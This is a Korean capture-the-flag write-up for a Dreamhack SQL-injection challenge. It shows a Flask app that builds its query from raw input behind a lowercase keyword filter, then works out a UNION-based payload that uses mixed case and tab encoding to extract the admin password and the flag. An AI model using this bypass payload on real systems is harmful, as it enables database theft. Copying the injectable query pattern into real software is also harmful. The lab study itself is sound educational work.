<!DOCTYPE html>
<html>
<head>
        <link rel="stylesheet" type="text/css" href="sytle.css">
</head>
<body>
        <h1>Dreamhack Web Hacking SQL Injection Bypass WAF Write-Up</h1>
</body>
<br>
<br>
</html>

문제 서버로 접속해 보자

![image](https://github.com/user-attachments/assets/6e6732e0-14d2-4df5-b9d1-6f471de6207a)

uid 칸에 hello라고 입력하니 WHERE문으로 들어가는 것을 확인할 수 있었다.

![image](https://github.com/user-attachments/assets/564ebedf-e31c-43f5-9c07-379ad84feb01)

이어서 문제 파일을 다운로드 받았다.

app.py 파일과 init.sql 파일이 들어있다.

app.py
```python
import os
from flask import Flask, request
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'users')
mysql = MySQL(app)

template ='''
<pre style="font-size:200%">SELECT * FROM user WHERE uid='{uid}';</pre><hr/>
<pre>{result}</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
'''

keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/']
def check_WAF(data):
    for keyword in keywords:
        if keyword in data:
            return True

    return False


@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        if check_WAF(uid):
            return 'your request has been blocked by WAF.'
        cur = mysql.connection.cursor()
        cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
        result = cur.fetchone()
        if result:
            return template.format(uid=uid, result=result[1])
        else:
            return template.format(uid=uid, result='')

    else:
        return template


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

init.sql
```python
CREATE DATABASE IF NOT EXISTS `users`;
GRANT ALL PRIVILEGES ON users.* TO 'dbuser'@'localhost' IDENTIFIED BY 'dbpass';

USE `users`;
CREATE TABLE user(
  idx int auto_increment primary key,
  uid varchar(128) not null,
  upw varchar(128) not null
);

INSERT INTO user(uid, upw) values('abcde', '12345');
INSERT INTO user(uid, upw) values('admin', 'DH{**FLAG**}');
INSERT INTO user(uid, upw) values('guest', 'guest');
INSERT INTO user(uid, upw) values('test', 'test');
INSERT INTO user(uid, upw) values('dream', 'hack');
FLUSH PRIVILEGES;
```

먼저 소스코드를 살펴보니 

```python
keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/']
def check_WAF(data):
    for keyword in keywords:
        if keyword in data:
            return True

    return False
```

요 부분에서 ```check_WAF()``` 함수를 통해 입력 값이 필터링 되고 있음을 알 수 있다.

필터링 과정에서 차단되는 단어는 union, select, from, and, or, admin, '', '*', '/'이다.

위 필터링을 우회할 수 있는 방법을 생각해보니 SQL에서는 SELECT와 select는 같은 것으로 취급된다. 

그러므로 WAF가 소문자만 필터링한다면 대문자 혹은 혼용 사용이 가능한 문자로 우회할 수 있을 것 같다. 

그리고 일반적인 공백(스페이스 바) 대신에 %09(탭)을 사용하면 우회할 수 있을 것 같다. 

위 두 방법을 적용하여 쿼리문을 작성해보면 다음과 같다.

```python
'%09Union%09Select%09upw%09From%09user%09where%09uid='Admin'#
```

![image](https://github.com/user-attachments/assets/1ff281cb-801a-4b88-aa36-9d2ab2493b11)

으악! 에러가 난다.

왜 에러가 나는지 곰곰히 생각해 보니 SQL의 UNION은 연산자를 사용할 때 앞 뒤 SELECT문에서 반환하는 컬럼 수가 일치하지 않으면 에러가 발생한다.

usr 테이블을 살펴보면 idx, uid, upw 3개의 컬럼이 있다.

```python
CREATE TABLE user(
  idx int auto_increment primary key,
  uid varchar(128) not null,
  upw varchar(128) not null
);
```

UNION을 사용하여 추가 데이터를 조회할 때도 3개의 컬럼을 반환하도록 해야 한다.

그리고 아래 소스코드에 따라 result[1] 즉, 두번째 컬럼의 값만을 반환하도록 설정되어 있으므로 upw를 두번째 위체에 쿼리해야한다.
```python
if result:
            return template.format(uid=uid, result=result[1])
```

컬럼수를 맞추기 위해 null값을 넣어 다시 쿼리문을 작성해 보면

```python
'Union Select null,(Select upw From user where uid='ADMIN'),null#'
```

url 인코딩으로 변환해 주면

```python
%27Union%09Select%09null,(Select%09upw%09From%09user%09where%09uid=%27ADMIN%27),null%23
```

![image](https://github.com/user-attachments/assets/66a7929a-42d5-4e7c-9eaf-4ff0d5771da5)

FLAG를 얻었다!!
DH{bc818d522986e71f9b10afd732aef9789a6db76d}
